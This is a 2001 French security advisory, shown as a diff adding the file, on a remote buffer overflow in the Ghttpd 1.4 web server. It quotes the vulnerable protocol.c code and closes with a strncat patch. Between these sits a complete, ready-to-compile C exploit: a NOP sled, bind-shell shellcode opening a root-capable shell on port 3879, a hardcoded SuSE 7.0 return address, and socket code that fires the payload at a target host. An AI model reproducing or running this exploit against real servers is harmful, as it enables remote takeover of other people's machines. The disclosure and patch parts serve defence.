@@ -1,0 +1,209 @@
+/*--------------------------------------------*/
+/*     - Advisory "Ghttpd 1.4" -              */
+/*--------------------------------------------*/
+/* Auteurs   : Lionel & Gangstuck             */
+/* Contact   : cronos56@yahoo.com             */
+/*             webmaster@clickmicro.com       */
+/* WEB	     : www.secu-fr.org                */
+/*             www.clickmicro.com             */
+/* IRC	     : #:secu-fr #clickmicro          */
+/*--------------------------------------------*/
+/* Party 2001 clickmicro & secu-fr 30/06/2001 */
+/*--------------------------------------------*/
+
+Adivosry Ghttpd 1.4 (www.GazTek.org) :
+====================================
+
+  Buffer overflow en remote sur les commandes
+    -> GET /'Ax157'
+    -> GET /cgi-bin/'Ax149'(environ).
+
+
+Code vulnerable :
+===============
+
+/* protocol.c */
+int serveconnection(int sockfd)
+{
+char filename[255];
+...
+Log("Connection from %s, request = \"GET %s\"", inet_ntoa(sa.sin_addr), ptr);
+
+	if(!strncmp(ptr, thehost->CGIBINDIR, strlen(thehost->CGIBINDIR)))
+	{/* Trying to execute a cgi-bin file ? lets check */
+		ptr2 = strstr(ptr, "?");
+		if(ptr2!=NULL) { ptr2[0] = '\0'; flag = 1; }
+
+		strcpy(filename, thehost->CGIBINROOT);
+		ptr += strlen(thehost->CGIBINDIR);
+		strcat(filename, ptr);
+
+		// Filename = program to execute
+		// ptr = filename in cgi-bin dir
+		// ptr2+1 = parameters
+...
+	strcpy(filename, thehost->DOCUMENTROOT);
+	strcat(filename, ptr);
+...
+
+/* ou */
+PTR == Entr�e socket
+CGIBINROOT == /usr/local/ghttpd/cgi-bin
+DOCUMENTROOT == /usr/local/ghttpd/htdocs
+
+
+Faille :
+======
+
+Le but est d'overflowder char filename[255]
+par ptr qui est le contenu de la demande URL.
+Nous avons proc�d� � un teste simple qui consiste
+� envoyer 157 A consecutifs dans la demande URL..
+ceci � provoqu� un overflow du daemon retournant
+alors comme adresse ret 41414141....
+
+Code Exploit (proof of concept) :
+===============================
+
+/*--------------------------------------------*/
+/* Ghttpd 1.4 remote exploit                  */
+/*--------------------------------------------*/
+/* Auteurs   : Lionel & Gangstuck             */
+/* Contact   : cronos56@yahoo.com             */
+/*             webmaster@clickmicro.com       */
+/* WEB	     : www.secu-fr.org                */
+/*             www.clickmicro.com             */
+/* IRC	     : #:secu-fr #clickmicro          */
+/*--------------------------------------------*/
+/* Party 2001 Lionel & Gangstuck - 30/06/2001 */
+/*--------------------------------------------*/
+/* GET /[NOPS] [shellcode] [ret] [ret]        */
+/* ret sur SuSe 7.0 : 0xbfffb504 == OK        */
+/*                    0xbfffb515 == LTRACE    */
+/*--------------------------------------------*/
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#define TAILLE 157 // taille du buffer � overflowder
+struct in_addr victim;
+char overflow[4096];
+char shellcode[] = // bind a shell to port 3879
+ "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
+"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
+"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
+"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
+"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
+"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
+"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
+"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";
+
+/* mise en place de l'overflow */
+int overflowed(char *ret){
+    int i;
+    memset(overflow, 0, sizeof(overflow));
+    strcpy(overflow,"GET /");
+    for(i=0;i<(TAILLE-(strlen(shellcode))); i++){
+      strcat(overflow,"\x90");
+    }
+    strcat(overflow, shellcode);
+    strcat(overflow, ret);
+    strcat(overflow, ret);
+}
+
+int envoie(struct in_addr addr,char *cport)
+{
+struct sockaddr_in serv;
+int s;
+int port=atoi(cport);
+
+s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+bzero(&serv,sizeof(serv));
+memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
+serv.sin_port=htons(port);
+serv.sin_family=AF_INET;
+if (connect(s,(struct sockaddr *)&serv,sizeof(serv)) < 0){
+  perror("connect");
+  exit(0);
+}
+ write(s,overflow,strlen(overflow));
+ write(s,"\n\n",2);
+ close(s);
+}
+
+int host_to_ip(char *hostname,struct in_addr *addr)
+{
+struct hostent *res;
+
+res=gethostbyname(hostname);
+if (res==NULL)
+  return(0);
+memcpy((char *)addr,res->h_addr,res->h_length);
+return(1);
+}
+
+
+int main(int argc, char **argv){
+    char ret[8], serveur[256], port[8];
+    printf("Exploit ghttpd_1.4 by Lionel and GangstucK\n\n");
+    if(argc<2) {
+       printf("Usage : %s <serveur IP> [port]\n", argv[0]);
+       exit(0);
+    }
+    if(argc==3){
+       strncpy(port, argv[2], 7);
+    }
+    else{
+       strcpy(port, "80\0");
+    }
+    strcpy(ret, "\x04\xb5\xff\xbf"); // ret pour suse 7.0
+    strncpy(serveur, argv[1], sizeof(serveur)-1);
+    overflowed(ret);
+    if (!host_to_ip(serveur,&victim))
+    {
+       fprintf(stderr,"Hostname lookup failure\n");
+       exit(0);
+    }
+    envoie(victim,port);
+    printf("Remote shell listening to port 3879\n");
+    exit(0);
+}
+
+
+Patch :
+=====
+
+/* patch.diff */
+
+44a45
+>       int tno;
+106,107c107,108
+<               strcat(filename, ptr);
+<
+---
+>               tno = strlen(filename);
+>               strncat(filename, ptr, sizeof(filename)-tno);
+143,144c144,145
+<       strcat(filename, ptr);
+<
+---
+>       tno = strlen(filename);
+>       strncat(filename, ptr, sizeof(filename)-tno);
+
+Pour appliquer le patch, faites :
+
+   $ patch protocol.c patch.diff
+
+
+Remerciements :
+=============
+   - Tzero / Subculture / Frstylez / Secu-fr / Clickmicro / Phreakon
+   - #secu-fr #clickmicro #tzero #shellscript
+   - Descript, Renar, RoX, Martony, Wp92, Vanille, ad, sebsb, manak,
+     CrazyLord, Kryl, medgi, Spud, Klemm, Psirac, OUAH, ohm, Saperus,
+     tout ceux qui nous soutiennent/aident et que nous oublions ici,
+     � toutes les tasp�, les freestylers et les djeunz de l'univers...
+     et une speciale � l'3l33t m00nc0wb0y (tu sux man) ...
+
